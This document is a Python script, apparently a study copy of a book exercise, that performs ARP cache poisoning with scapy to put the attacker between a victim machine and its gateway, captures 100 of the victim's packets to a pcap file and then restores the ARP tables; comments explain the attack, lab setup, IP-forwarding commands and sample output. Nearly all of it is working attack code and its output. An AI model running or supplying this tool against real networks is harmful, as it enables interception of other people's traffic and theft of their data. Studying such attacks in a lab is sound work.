# 𝗔𝗥𝗣 𝗔𝘁𝘁𝗮𝗰𝗸𝘀:
# It consist of, basically, convincing the target that we are it's gateway
# Smilarly, we convince the actual gateway that we are a router to the target
# Thus, all trafic between both entities ends up going through us
# To do so, we poison the ARP cache of both points and masks ourself with their MACs (Media Acces Control) address
# The MAC is assigned based on the local network IP of the machine
# 𝘪𝘱 𝘯𝘦𝘪𝘨𝘩 𝘴𝘩𝘰𝘸 <to see ARP cache in linux>
# sudo arp -a <works too>

import os
import sys
import time
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, sendp, sniff, sndrcv, srp, wrpcap)

def get_mac(targetship):
    packet = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetship)
    # Pass target ip to create a packet, 𝘌𝘵𝘩𝘦𝘳 𝘧𝘰𝘳 𝘣𝘳𝘰𝘢𝘥𝘤𝘢𝘴𝘵 and 𝘈𝘙𝘗 𝘵𝘰 𝘳𝘦𝘲𝘶𝘦𝘴𝘵 𝘔𝘈𝘊 
    resp, _ = srp(packet, timeout=2, retry=0, verbose=False)
    # pass packet onto srp to send on Nerwork level 2 (it also receives)
    for _, r in resp:
        return r[Ether].src
    return None 

class Arper:
    def __init__(self, victim, gateway, interface = 'eth0'):
        self.victim = victim
        self.victimMac = get_mac(victim)
        self.gateway = gateway
        self.gatewayMac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0 
        # initialize the class with the victim and gateway to get their MAC. Specify interface (eth0 as default)
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewayMac}')
        print(f'Victim ({victim}) is at {self.victimMac}')
        print('-'*30)
    
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        # Poison start to unleach attack
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
        # Sniff start to track attack by network sniffing
    
    def poison(self):
        poison_victim = ARP() # poisoned ARP packet for the victim
        poison_victim.op = 2
        poison_victim.psrc = self.gateway # Sending gateway IP 
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimMac # but the attackers MAC 
        
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-'*30)

        poison_gateway = ARP() # poisoned ARP packet for the gateway
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway # Sending victim IP
        poison_gateway.hwdst = self.gatewayMac # but attackers MAC
        
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-'*30)
        
        print('Beginning the ARP poison. [CTRL-C to stop]')
        
        while True: # Infinite loop of sending so the packet remain poisoned during the attack
            sys.stdout.write('.')
            sys.stdout.flush()
            
            try:
                sendp(Ether(dst=self.victimMac)/poison_victim)
                sendp(Ether(dst=self.gatewayMac)/poison_gateway)
            except KeyboardInterrupt: # end the loop (ie the attack) by restoring the arp cache state
                self.restore()
                sys.exit()
            else:
                time.sleep(2)
        
    def sniff(self, count=100):
        time.sleep(5) # Wait five
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface) # Sniff n packets (100 by default)
        wrpcap('arper.pcap', packets) # write off packets to arper.pcap
        print("Got em' packets! Ɛ( · — ·)3")
        self.restore() # Restore ARP table
        self.poison_thread.terminate() # Stop poisoning
        print('Finished')
       
    def restore(self):
        print('Restoring ARP tables...')
        sendp(Ether(dst=self.victimMac)/ARP(
            op = 2,
            psrc = self.gateway,
            hwsrc = self.gatewayMac,
            pdst = self.victim,
            hwdst = 'ff:ff:ff:ff:ff:ff'),
            count = 5)
        sendp(Ether(dst=self.gatewayMac)/ARP(
            op = 2,
            psrc = self.victim,
            hwsrc = self.victimMac,
            pdst = self.gateway,
            hwdst = 'ff:ff:ff:ff:ff:ff'),
            count = 5)
    
if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    arpoon = Arper(victim, gateway, interface)
    arpoon.run()
    
# 𝗡𝗼𝘁𝗲𝘀: Replaced send() (used in the book) with sendp
# - send() does not craft a full ethernate frame
# - Meaning, you get error: WARNING: You should be providing the Ethernet destination MAC address when sending an is-at ARP.
# - To solve, we replace with sendp() [check book for original with send()]
    
# 𝗧𝗲𝘀𝘁: 
# Victim OS: Windows 10
# Attacker OS: Kali Linux
#
#                      victim    gateway  interface
# sudo python arper.py 10.0.2.15 10.0.2.1 eth0
#
# ----------------------- Optional if comuncation not happening --------------------------
# 𝘦𝘤𝘩𝘰 1 > /𝘱𝘳𝘰𝘤/𝘴𝘺𝘴/𝘯𝘦𝘵/𝘪𝘱𝘷4/𝘪𝘱_𝘧𝘰𝘳𝘸𝘢𝘳𝘥 <run before arper.py>
# 𝘴𝘶𝘥𝘰 𝘴𝘺𝘴 -𝘸 𝘯𝘦𝘵.𝘪𝘯𝘦𝘵.𝘪𝘱.𝘧𝘰𝘳𝘸𝘢𝘳𝘥𝘪𝘯𝘨=1 <lets the host know that we can forward packages>

# 𝗢𝘂𝘁𝗽𝘂𝘁:
# sudo python arper.py 10.0.2.15 10.0.2.1 eth0
# Initialized eth0:
# Gateway (10.0.2.1) is at 52:54:00:12:35:00
# Victim (10.0.2.15) is at 08:00:27:6e:ad:bb
# ------------------------------
# ip src: 10.0.2.1
# ip dst: 10.0.2.15
# mac src: 08:00:27:87:ae:89
# mac dst: 08:00:27:6e:ad:bb
# ARP is at 08:00:27:87:ae:89 says 10.0.2.1
# ------------------------------
# ip src: 10.0.2.15
# ip dst: 10.0.2.1
# mac src: 08:00:27:87:ae:89
# mac dst: 52:54:00:12:35:00
# ARP is at 08:00:27:87:ae:89 says 10.0.2.15
# ------------------------------
# Beginning the ARP poison. [CTRL-C to stop]
# ...Sniffing 100 packets
# ..........Got em' packets! Ɛ( · — ·)3
# Restoring ARP tables...
# Finished
# <check arper.pcap and ensure it is populated> 